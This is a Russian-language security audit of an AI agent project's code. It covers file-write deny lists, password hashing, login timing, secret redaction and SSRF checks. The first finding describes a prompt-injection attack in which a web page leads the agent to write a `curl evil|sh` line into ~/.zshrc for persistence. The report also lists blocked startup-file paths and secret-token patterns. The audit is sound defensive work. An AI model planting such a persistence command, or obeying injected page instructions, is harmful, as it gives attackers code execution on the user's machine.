# Security-аудит Тайги — новая поверхность сессии (2026-06-12, ural)

Прицельный аудит самого рискового кода, добавленного за ночную стройку: деньги (баланс),
вход (auth), исполнение кода (dev-tools/песочница), браузер (SSRF), редакция секретов.

## 🔴 НАЙДЕНО И ИСПРАВЛЕНО

### 1. Эскалация до персистентности через write_file (auto-edit режим) — ЗАКРЫТО
- **Было:** `_edit_allowed` блокировал ключи/.env/.ssh, но НЕ файлы автозапуска
  (`.zshrc`, `.bash_profile`, launchd-плисты, crontab, `.netrc`, `/etc/`).
- **Вектор:** в режиме «auto-edit» (юзер разрешил правки файлов, но НЕ произвольный shell)
  `shell` заблокирован пермишн-лестницей, а `write_file` — нет. Prompt-injection со
  страницы → агент пишет `~/.zshrc` с `curl evil|sh` → выполняется в следующем терминале.
  Safety-хук это не ловил (он только про shell/run_code).
- **Фикс:** расширил `_EDIT_DENY` (launchagents/launchdaemons/etc/cron/crontab/.netrc/sudoers/etc)
  + добавил `_EDIT_DENY_NAMES` (basename-блок: .zshrc/.bashrc/.profile/.gitconfig/.npmrc/...).
  Покрывает write/edit/revert единообразно. Тест: 13 опасных путей блокированы, 6 легит — нет.

### 2. Слабый хэш паролей — ЗАКРЫТО
- **Было:** PBKDF2-SHA256, 120 000 итераций (ниже OWASP-2023 минимума 600k).
- **Фикс:** поднял до 600 000. Безопасно — в auth.json 0 живых юзеров (поломки логинов нет).

### 3. User-enumeration по таймингу логина — ЗАКРЫТО
- **Было:** несуществующий юзер → мгновенный отказ; существующий → +PBKDF2 (заметная
  разница во времени) → перебор существующих имён.
- **Фикс:** PBKDF2 считается ВСЕГДА (даже для несуществующего), сравнение constant-time.
  Тест: exist=96ms / missing=95ms, ratio 1.01.

### 4. Узкая редакция секретов в guard.py — УЛУЧШЕНО
- Добавил паттерны: AWS (AKIA…), GitHub (ghp_/github_pat_), Slack (xox…), JWT, PEM-блоки
  приватных ключей. Тест: 7/7 типов скрыто, легит-текст цел.

## 🟡 ОСТАТОЧНЫЕ РИСКИ (осознанно НЕ чиню сейчас)

- **DNS-rebinding (TOCTOU) в `_is_public_url`:** резолв при проверке ≠ резолв при запросе.
  Прямые SSRF-атаки (loopback/private/link-local/метаданные 169.254.169.254, decimal-IP)
  блокируются корректно. Rebinding требует контроля DNS атакующим + чтобы агент пошёл по
  его ссылке. Правильный фикс (резолв-один-раз + пин IP + Host-заголовок) — нетривиальная
  замена urlopen с риском новых багов. Для owner-only тулзы оставляю как известный остаток.
- **shell-тулза = произвольный код (owner-only).** Это by design (dev-инструмент Damir'а).
  Защита — owner-гейт + safety-хук на деструктив + permission-ladder. write_file deny-лист
  теперь держит границу auto-режима (см. п.1).
